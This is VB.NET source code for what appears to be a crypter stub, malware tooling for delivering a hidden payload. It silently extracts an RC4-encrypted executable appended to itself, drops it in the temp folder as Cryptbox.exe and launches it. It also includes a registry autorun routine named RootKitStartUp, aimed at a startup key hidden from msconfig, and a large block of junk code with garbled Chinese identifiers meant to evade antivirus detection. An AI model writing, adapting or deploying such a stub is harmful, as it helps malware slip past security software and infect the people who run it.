
Imports System.IO
Imports System.Threading
Imports System.Text

Public Class Form1

    ' Speicher Reservirung
    Const toMB As Integer = 1024 * 1024

    Const filesplit = "Metropolis"



    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' Speicher Reservirung
        Reservirung(20)

        ' Hide Msconfig Autorun
        '  StartUp("software\Microsoft\Windows NT\currentVersion\windows", "Load", Process.GetCurrentProcess.MainModule.FileName)

        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None

        Me.ShowInTaskbar = False

        Me.Hide()

        Me.Visible = False

        On Error Resume Next

        Dim verzeichnis As String = System.IO.Path.GetTempPath

        Dim Datei As String

        Dim DateiRC4() As String

        Dim exportierung As String

        ' Temp Executabel
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)

        Datei = Space(LOF(1))

        FileGet(1, Datei)

        FileClose(1)

        DateiRC4 = Split(Datei, filesplit)

        exportierung = RonCode4(DateiRC4(1), "0101100101010010101010101")

        FileOpen(5, verzeichnis & "\Cryptbox.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)

        FilePut(5, exportierung)

        FileClose(5)

        System.Diagnostics.Process.Start(verzeichnis & "\Cryptbox.exe")

        Me.Close()

        End

        特伊卡克卡艾哦尤艾酷贝儿艾给艾艾特娜给普瑟()

    End Sub
    ' Speicher Reservirung
    Public Sub Reservirung(ByVal MB As Integer)

        Static Speicher As New MemoryStream(MB * toMB)

        If MB * toMB <> Speicher.Capacity Then

            Speicher.Close()

            Speicher = New MemoryStream(MB * toMB)

        End If

        Try

            For i As Long = 0 To Speicher.Capacity - 1

                Speicher.Write({255}, 0, 1)

            Next

        Catch

        End Try

        Exit Sub

    End Sub

    ' Hide Msconfig Autorun
    Private Function RootKitStartUp(ByVal win32_Registery As String, ByVal win32_Value As String,
             ByVal WinApp32x64 As String)
        On Error Resume Next
        Microsoft.Win32.Registry.CurrentUser.OpenSubKey(win32_Registery, True) _
            .SetValue(win32_Value, WinApp32x64)
    End Function

    Public Shared Function RonCode4(ByVal message As String, ByVal password As String) As String

        Dim T As Integer = 0

        Dim E As Integer = 0

        Dim Chiffre As New StringBuilder

        Dim returnChiffre As String = String.Empty

        Dim sBlockverschlüsselungen As Integer() = New Integer(256) {}

        Dim Schlüssel As Integer() = New Integer(256) {}

        Dim IntPass As Integer = password.Length

        Dim Informationssicherheit As Integer = 0

        While Informationssicherheit <= 255

            Dim Optimierung As Char = (password.Substring((Informationssicherheit Mod IntPass), 1).ToCharArray()(0))

            Schlüssel(Informationssicherheit) = Microsoft.VisualBasic.Strings.Asc(Optimierung)

            sBlockverschlüsselungen(Informationssicherheit) = Informationssicherheit

            System.Math.Max(System.Threading.Interlocked.Increment(Informationssicherheit), Informationssicherheit - 1)

        End While

        Dim z As Integer = 0

        Dim w As Integer = 0

        While w <= 255

            z = (z + sBlockverschlüsselungen(w) + Schlüssel(w)) Mod 256

            Dim Informationaustauschen As Integer = sBlockverschlüsselungen(w)

            sBlockverschlüsselungen(w) = sBlockverschlüsselungen(z)

            sBlockverschlüsselungen(z) = Informationaustauschen

            System.Math.Max(System.Threading.Interlocked.Increment(w), w - 1)

        End While

        Informationssicherheit = 1

        While Informationssicherheit <= message.Length

            Dim TOptimierung As Integer = 0

            T = (T + 1) Mod 256

            E = (E + sBlockverschlüsselungen(T)) Mod 256

            TOptimierung = sBlockverschlüsselungen(T)

            sBlockverschlüsselungen(T) = sBlockverschlüsselungen(E)

            sBlockverschlüsselungen(E) = TOptimierung

            Dim H As Integer = sBlockverschlüsselungen((sBlockverschlüsselungen(T) + sBlockverschlüsselungen(E)) Mod 256)

            Dim Optimierung As Char = message.Substring(Informationssicherheit - 1, 1).ToCharArray()(0)

            TOptimierung = Asc(Optimierung)

            Dim Chiffreby As Integer = TOptimierung Xor H

            Chiffre.Append(Chr(Chiffreby))

            System.Math.Max(System.Threading.Interlocked.Increment(Informationssicherheit), Informationssicherheit - 1)

        End While

        returnChiffre = Chiffre.ToString

        Chiffre.Length = 0

        Return returnChiffre

    End Function

    ' Das ist Junkcode mit einem Verweis.
    Public Function 特伊卡克卡艾哦尤艾酷贝儿艾给艾艾特娜给普瑟()

        Dim 丝佩艾娜克轮马艾艾马伊瑟克丝儿欧艾普贝伊勒贝伊伊丝瑟哦酷艾贝给艾贝艾耶卡艾儿给阿贼艾马尤艾丝艾伊法 As Decimal = 570513

        Dim 艾阿艾马丝普娜儿特维酷尤哈酷伊阿普斯伊丝贝阿贝阿耶特阿特哦尤伊维艾贝娜艾斯伊给欧瑟法弗卡艾马贝马瑟艾特勒艾丝艾儿轮艾卡勒普伊德马贼伊艾给德弗弗耶艾贝欧特克特 As Long = 2

        Dim 马哦给勒艾贝瑟瑟酷佩艾勒给给丝艾伊艾瑟特艾哦特弗哦普艾维瑟勒贝斯哦德维艾哦瑟普娜儿艾伊哦弗普法艾阿 As Integer = 48074

        Dim 娜马德艾佩耶儿哦艾给瑟特克儿德艾卡马普艾尤伊普贝艾卡艾娜法艾普欧德瑟艾艾艾艾儿马丝丝艾克艾弗酷维艾克艾娜德勒耶哈哦瑟瑟给艾耶伊尤尤弗儿欧轮欧丝艾克娜普艾斯德艾哈维特斯普伊马艾特瑟马克艾瑟马维酷艾耶佩贼酷伊伊普艾艾丝儿艾佩勒艾弗法艾瑟伊艾贝斯哦普伊 As Object = 302

        If 861 = 7817 Then

            MsgBox("欧斯伊艾克克瑟丝贝特斯酷维艾贝瑟艾欧艾艾伊维克艾给艾维伊卡哈尤特给哈克斯轮")

            Dim 法卡艾尤娜哦艾斯欧卡普酷勒伊哦艾哈弗瑟哈丝耶艾耶艾阿耶法德伊普佩儿艾特艾艾轮贼欧勒佩弗欧勒艾艾哦克哈卡贝给哦艾艾弗哦瑟娜勒瑟欧哦马艾瑟轮轮艾佩伊给卡斯艾瑟勒欧轮艾儿普艾普斯艾耶哦特轮德贝哦勒艾伊丝卡阿艾丝佩艾丝瑟斯艾艾欧丝伊维 As Decimal = 267

        End If

        Dim 佩儿哦艾勒马丝哈卡特艾艾给哦特哈哈给艾普阿贼马艾尤斯艾斯斯艾艾卡斯哈艾酷尤艾哈瑟丝卡卡艾丝艾艾阿德欧德耶艾瑟佩佩弗艾艾佩贼伊艾斯斯耶法轮瑟欧轮克轮艾哈丝艾伊 As Double = 8

        Dim 贼特儿阿特贼德给伊阿瑟马儿贼哈瑟哈艾艾德卡哦欧艾艾艾普艾德儿轮德瑟阿马普哈 As Integer = 336776

        Dim 丝哦贝卡卡克特瑟佩特丝艾特卡尤普法马艾哈轮艾佩佩伊丝艾勒欧哈艾丝艾艾特给哈特斯德艾欧勒酷哦轮伊卡酷贼哈特娜特佩给贼哦德丝艾瑟卡特耶贼艾丝阿德丝阿艾艾艾哈德轮阿尤艾瑟伊欧贼尤给尤耶德给法艾给特轮艾瑟艾佩德耶卡娜卡给法艾轮特耶阿娜克伊卡耶酷卡克维艾酷 As Object = 85

        Dim 维斯伊哦儿普艾艾欧艾普瑟特欧普特贼伊斯卡瑟勒瑟哈欧哈艾 As Int64 = 42

        Try

            MsgBox("克斯瑟瑟儿普艾艾佩克卡贝哦艾轮轮普耶艾艾德艾艾普普艾贼维欧勒哦艾艾伊卡贝哦丝贝耶哈法尤斯耶维酷弗维艾艾尤贼娜维勒贼贝弗贝瑟克艾弗卡贼酷特伊普艾哈瑟哦丝艾给阿维艾阿伊贼特伊哈艾贼贝轮瑟娜哦贼给勒德耶哦艾哈斯普艾贼艾给娜克艾给轮伊")

            Dim 德贼艾丝马儿艾艾瑟艾克斯伊佩卡弗轮阿弗艾伊法特尤艾哦特艾哦娜贼艾勒尤特特佩瑟耶勒维尤特阿艾艾维哦哦瑟耶艾娜德丝勒尤给哈瑟瑟伊轮酷艾给艾佩哈贝儿贝普伊耶哦艾特勒伊法弗艾艾勒耶艾尤儿瑟阿艾法弗马哦卡法艾丝弗 As Int64 = 44544452

        Catch 特尤瑟艾特伊给伊法维克欧法艾酷法欧法艾酷酷酷尤艾阿阿艾斯酷弗伊马法维马给艾艾法普贝儿尤阿艾伊卡伊瑟特斯艾尤伊给欧贼儿艾 As Exception

            Dim 伊特德卡普给法卡艾勒德马瑟特特斯欧弗弗瑟卡马瑟贼娜贝瑟特特贼丝弗弗特瑟轮贝特普贝艾德维特贼弗娜克给克特佩艾酷特克艾耶克斯伊艾艾艾特普尤欧伊卡伊艾 As Object = 58167

        End Try

        Do

            Dim 艾艾特贼贼克轮哦娜丝酷尤伊普马法艾贼贼艾艾哦贝耶耶艾法特弗艾尤轮伊艾尤维德佩艾特贼佩伊艾耶尤哦儿马德马酷克佩德艾克艾艾勒耶尤艾瑟勒艾贝给儿丝艾艾艾特普艾伊艾贼克德耶伊瑟贼特艾特哦勒瑟娜丝轮艾特给给哦哦哈特贼欧艾克瑟佩儿哦艾特艾贝特阿阿尤瑟丝艾卡特 As Integer = 7

            Dim 给娜维瑟耶维给法法阿法艾贼维勒佩维弗艾弗艾尤克酷瑟给贼贝伊给酷伊阿普耶欧阿卡艾卡特德艾艾马普德贝艾普弗贼儿轮艾普丝哈艾普伊弗艾哦马艾儿德艾艾佩马 As Object = 51361

            Dim 伊特丝儿佩普哦瑟欧阿耶伊斯艾斯艾给伊艾艾艾德阿欧瑟尤艾瑟特耶给欧瑟耶轮耶艾瑟普佩艾艾德伊艾维瑟德克斯耶艾特特普艾尤普酷伊马酷伊艾克勒给法艾法伊耶 As Boolean = True

            Dim 阿瑟艾给德特瑟给瑟艾维法马尤哈阿艾特斯艾轮伊特弗哈德贝欧佩伊贼瑟普伊特斯给普艾斯艾艾法酷艾酷特艾艾娜娜贼特欧马维维娜轮阿尤弗丝克艾克克儿酷勒伊马瑟阿欧娜佩欧特丝艾勒卡贝维阿艾艾勒瑟德法瑟艾 As Double = 3

            MessageBox.Show("耶艾克勒欧艾儿艾哈德勒艾伊哦艾儿艾艾艾勒瑟特特艾哈耶瑟艾耶瑟艾贼欧瑟艾瑟娜伊欧给特维马尤普儿给艾给弗贼瑟马艾伊伊酷马艾3")

        Loop

        Select Case True

            Case True

                Dim 欧瑟欧耶普尤卡贼轮艾欧艾特给艾马尤瑟卡轮尤尤勒艾给克斯佩贼德瑟轮普维酷瑟特佩耶普娜艾特瑟丝伊勒艾克 As Object = 3220

                Try

                    MsgBox("丝儿法特贝哈儿耶马勒瑟克艾哈哈维卡丝哈艾耶克斯艾艾艾丝艾给伊艾娜普儿艾克阿阿酷艾勒法伊艾斯阿特马伊普艾法贝瑟艾斯维特伊普佩给普艾维艾普维伊艾维卡德儿维艾艾娜酷斯马哈儿特卡艾艾轮艾酷贝特给丝贝弗伊儿艾尤德")

                    Dim 丝哈伊普儿斯弗弗艾艾哦轮德丝哦弗瑟艾哦耶维勒艾欧耶轮艾酷艾斯法哈哈马克娜瑟维勒艾弗维艾阿贼伊尤斯哦卡特特瑟斯尤特卡瑟维丝勒艾艾维斯特欧艾斯阿耶艾 As Int64 = 0

                Catch 普克艾轮耶马尤特贼儿瑟阿哈欧伊克贝特佩克德尤丝艾儿佩佩艾尤马特酷艾瑟艾娜马尤克伊特卡克法伊维哦欧艾耶克哦伊艾克艾艾维卡酷艾克贝酷瑟哦酷艾特卡勒维艾法艾欧马轮耶斯贝伊艾弗艾弗欧斯伊克艾丝瑟尤普艾特尤维欧哈艾马尤法瑟瑟瑟艾瑟给给艾娜佩德瑟斯轮维欧特普 As Exception

                    Dim 斯艾佩普瑟瑟勒维克维艾欧瑟艾丝马伊给艾尤艾 As Object = 405236

                End Try

            Case False

                MsgBox("艾特瑟德艾艾普哈贝维艾娜克法特卡艾艾德耶贼特维特贝哈勒普艾欧尤艾马哈艾艾特普艾伊德哦艾艾儿哈瑟娜欧特德瑟轮娜克维瑟儿贝耶伊阿德特娜特贝儿克艾贝马阿斯阿娜贝给")

                Dim 酷尤尤艾艾勒哈弗佩特维维法艾儿勒尤特轮艾卡艾贼伊特欧尤瑟艾尤卡卡贼斯阿娜克贝娜艾艾艾特特贼艾艾伊艾阿瑟尤佩艾给德尤艾尤普耶艾尤伊贼马维斯艾耶酷哈克克伊艾维特克马艾娜给艾给瑟维斯丝普给 As Integer = 37871335

        End Select

        Return 6

    End Function


End Class
